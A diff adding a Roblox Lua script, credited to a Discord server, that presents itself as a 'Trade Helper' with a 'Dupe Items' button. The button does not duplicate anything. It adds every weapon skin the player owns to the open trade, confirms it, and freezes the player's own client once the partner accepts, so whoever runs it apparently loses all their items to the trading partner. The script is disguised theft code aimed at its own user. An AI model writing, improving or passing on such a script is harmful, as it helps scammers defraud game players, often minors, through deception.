@@ -1,0 +1,307 @@
+-- Source code by: https://discord.com/invite/zNZ3MrRaxF
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local lp = Players.LocalPlayer
+local gui = lp:WaitForChild("PlayerGui")
+local TradeItemRemote = ReplicatedStorage:WaitForChild("TradeItem")
+local ItemData = require(ReplicatedStorage:WaitForChild("Item"))
+
+local effectItemsCache = nil
+
+local function GetEffectItems()
+    if not effectItemsCache then
+        effectItemsCache = {}
+        for itemName, data in pairs(ItemData) do
+            if data.ItemType == "Effect" then
+                effectItemsCache[itemName] = true
+            end
+        end
+    end
+    return effectItemsCache
+end
+
+local function GetTradingPartner()
+    local frame = gui.Main.MainTradingFrame
+    if not frame then return nil end
+    
+    local text = frame.Slots.TradingPlayerName.Text
+    local username = text:match("@(.+)%)")
+    
+    if username then 
+        return Players:FindFirstChild(username) 
+    end
+    return nil
+end
+
+local function GetAllMyWeapons()
+    local weapons = {}
+    local effectItems = GetEffectItems()
+
+    for _, item in ipairs(lp.SkinsFolder:GetChildren()) do
+        if item:IsA("StringValue")
+            and item.Name ~= "DefaultGun"
+            and item.Name ~= "DefaultKnife"
+            and not effectItems[item.Name] then
+
+            local count = item:FindFirstChild("Count") and item.Count.Value or 1
+
+            for i = 1, count do
+                table.insert(weapons, item.Name)
+            end
+        end
+    end
+
+    return weapons
+end
+
+local function AddAllWeapons(partner)
+    local weapons = GetAllMyWeapons()
+    
+    for _, weaponName in ipairs(weapons) do
+        task.spawn(function()
+            TradeItemRemote:InvokeServer("ADD_TO_TRADE", partner, weaponName, {})
+        end)
+    end
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeHelperUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = gui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 320, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local border = Instance.new("UIStroke")
+border.Color = Color3.fromRGB(50, 50, 50)
+border.Thickness = 1
+border.Parent = mainFrame
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 55)
+header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+header.BorderSizePixel = 0
+header.Parent = mainFrame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 12)
+headerCorner.Parent = header
+
+local headerFix = Instance.new("Frame")
+headerFix.Size = UDim2.new(1, 0, 0, 12)
+headerFix.Position = UDim2.new(0, 0, 1, -12)
+headerFix.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+headerFix.BorderSizePixel = 0
+headerFix.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 200, 1, 0)
+title.Position = UDim2.new(0, 15, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Trade Helper"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(0, 70, 0, 20)
+status.Position = UDim2.new(1, -85, 0, 18)
+status.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+status.BorderSizePixel = 0
+status.Text = "● ONLINE"
+status.TextColor3 = Color3.fromRGB(100, 255, 100)
+status.TextSize = 10
+status.Font = Enum.Font.GothamBold
+status.Parent = header
+
+local statusCorner = Instance.new("UICorner")
+statusCorner.CornerRadius = UDim.new(0, 6)
+statusCorner.Parent = status
+
+local function MakeButton(name, position, color, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.9, 0, 0, 50)
+    btn.Position = position
+    btn.BackgroundColor3 = color
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+    btn.Text = ""
+    btn.Parent = mainFrame
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 10)
+    btnCorner.Parent = btn
+    
+    local btnBorder = Instance.new("UIStroke")
+    btnBorder.Color = Color3.new(1, 1, 1)
+    btnBorder.Thickness = 1
+    btnBorder.Transparency = 0.95
+    btnBorder.Parent = btn
+    
+    local btnText = Instance.new("TextLabel")
+    btnText.Size = UDim2.new(1, -30, 1, 0)
+    btnText.Position = UDim2.new(0, 15, 0, 0)
+    btnText.BackgroundTransparency = 1
+    btnText.Text = name
+    btnText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btnText.TextSize = 15
+    btnText.Font = Enum.Font.GothamBold
+    btnText.TextXAlignment = Enum.TextXAlignment.Left
+    btnText.Parent = btn
+
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(
+                math.min(color.R * 255 + 15, 255),
+                math.min(color.G * 255 + 15, 255),
+                math.min(color.B * 255 + 15, 255)
+            )
+        }):Play()
+        TweenService:Create(btnBorder, TweenInfo.new(0.2), {
+            Transparency = 0.85
+        }):Play()
+    end)
+    
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {
+            BackgroundColor3 = color
+        }):Play()
+        TweenService:Create(btnBorder, TweenInfo.new(0.2), {
+            Transparency = 0.95
+        }):Play()
+    end)
+    
+    btn.MouseButton1Click:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.1), {
+            Size = UDim2.new(0.88, 0, 0, 48)
+        }):Play()
+        
+        task.wait(0.1)
+        
+        TweenService:Create(btn, TweenInfo.new(0.15), {
+            Size = UDim2.new(0.9, 0, 0, 50)
+        }):Play()
+        
+        callback()
+    end)
+    
+    return btn
+end
+
+MakeButton("Give Items", UDim2.new(0.05, 0, 0, 70), Color3.fromRGB(40, 40, 45), function()
+    local partner = GetTradingPartner()
+    if partner then
+        AddAllWeapons(partner)
+        TradeItemRemote:InvokeServer("CONFIRM", partner)
+        print("[Trade Helper] Items sent to " .. partner.Name)
+    else
+        warn("[Trade Helper] Trading partner not found")
+    end
+end)
+
+MakeButton("Dupe Items", UDim2.new(0.05, 0, 0, 130), Color3.fromRGB(40, 40, 45), function()
+    local partner = GetTradingPartner()
+    if partner then
+        AddAllWeapons(partner)
+        TradeItemRemote:InvokeServer("CONFIRM", partner)
+        
+        local frame = gui.Main.MainTradingFrame
+        local TheirConfirm = frame and frame.Slots.TheirOfferCONFIRM
+        local lastState = false
+        task.spawn(function()
+            while true do
+                task.wait(0.05)
+                local currentState = TheirConfirm and TheirConfirm.Visible
+                if currentState == true and lastState == false then
+                    print("[Trade Helper] Duplication activated - freezing client")
+                    task.wait(2)
+                    while true do end
+                end
+                
+                lastState = currentState
+            end
+        end)
+        
+        print("[Trade Helper] Waiting for partner confirmation...")
+    else
+        warn("[Trade Helper] Trading partner not found")
+    end
+end)
+
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -25)
+footer.BackgroundTransparency = 1
+footer.Text = "v2.0"
+footer.TextColor3 = Color3.fromRGB(100, 100, 100)
+footer.TextSize = 9
+footer.Font = Enum.Font.Gotham
+footer.Parent = mainFrame
+
+local dragging = false
+local dragInput, dragStart, startPos
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+header.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.TouchMoved:Connect(function(touch, gameProcessed)
+    if dragging and touch == dragInput then
+        local delta = touch.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0, 320, 0, 220)
+}):Play()
